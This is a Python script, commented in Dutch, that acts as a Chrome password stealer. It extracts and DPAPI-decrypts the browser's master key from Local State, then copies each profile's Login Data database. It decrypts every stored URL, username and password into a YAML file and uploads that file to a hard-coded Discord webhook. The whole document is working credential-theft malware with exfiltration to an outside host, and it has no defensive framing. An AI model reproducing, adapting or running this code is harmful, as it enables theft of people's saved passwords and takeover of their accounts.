import os
import re
import sys
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil
import csv
import time
import requests
import yaml

CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data"%(os.environ['USERPROFILE']))

def get_secret_key():
    try:
        with open(CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        secret_key = secret_key[5:] 
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except Exception as e:
        print("%s"%str(e))
        print("[ERR] Chrome secretkey cannot be found")
        return None

def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(ciphertext, secret_key):
    try:
        initialisation_vector = ciphertext[3:15]
        encrypted_password = ciphertext[15:-16]
        cipher = generate_cipher(secret_key, initialisation_vector)
        decrypted_pass = decrypt_payload(cipher, encrypted_password)
        decrypted_pass = decrypted_pass.decode()  
        return decrypted_pass
    except Exception as e:
        print("%s"%str(e))
        print("[ERR] Unable to decrypt, Chrome version <80 not supported. Please check.")
        return ""

def get_db_connection(chrome_path_login_db):
    try:
        shutil.copy2(chrome_path_login_db, "Loginvault.db")
        return sqlite3.connect("Loginvault.db")
    except Exception as e:
        print("%s"%str(e))
        print("[ERROR] Chrome database cannot be found, please try to run the code again!")
        return None

# Voeg hier je Discord Webhook URL toe
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1167022214248419348/6Moh202G_13YxG3NCw9F_gqtV72Hj1KTUnLFupopGzkIrR5es0YAEI_o0zLxvyEQO2BD"

if __name__ == '__main__':
    try:
        with open('decrypted_chrome_password.yaml', mode='w', newline='', encoding='utf-8') as decrypt_password_file:
            secret_key = get_secret_key()
            folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$", element) != None]
            for folder in folders:
                chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data" % (CHROME_PATH, folder))
                conn = get_db_connection(chrome_path_login_db)
                if secret_key and conn:
                    decrypted_passwords = []  # Lijst om gedecodeerde wachtwoorden op te slaan
                    cursor = conn.cursor()
                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                    for index, login in enumerate(cursor.fetchall(), start=1):
                        url = login[0]
                        username = login[1]
                        ciphertext = login[2]
                        if url and username and ciphertext:
                            decrypted_password = decrypt_password(ciphertext, secret_key)
                            decrypted_passwords.append({
                                "index": index,
                                "url": url,
                                "username": username,
                                "password": decrypted_password
                            })
                            # Schrijf naar het YAML-bestand
                            decrypt_password_file.write("index: {}\n".format(index))
                            decrypt_password_file.write("url : {}\n".format(url))
                            decrypt_password_file.write("username: {}\n".format(username))
                            decrypt_password_file.write("password: {}\n".format(decrypted_password))
                            decrypt_password_file.write("========================\n")
                    cursor.close()
                    conn.close()
                    os.remove("Loginvault.db")
                    
                    # Verstuur de gedecodeerde wachtwoorden naar Discord
                    with open('decrypted_chrome_password.yaml', 'r', encoding='utf-8') as yaml_file:
                        yaml_content = yaml_file.read()
                        
                    payload = {
                        "content": "Gedecodeerde Chrome Wachtwoorden:",
                        "file": (f"decrypted_chrome_password.yaml", yaml_content)
                    }
                    
                    response = requests.post(DISCORD_WEBHOOK_URL, files=payload)
                    if response.status_code != 200:
                        print(f"Er is een fout opgetreden bij het verzenden van de webhook: {response.status_code}")
                    
    except Exception as e:
        print("[ERR] %s" % str(e))
    time.sleep(1)
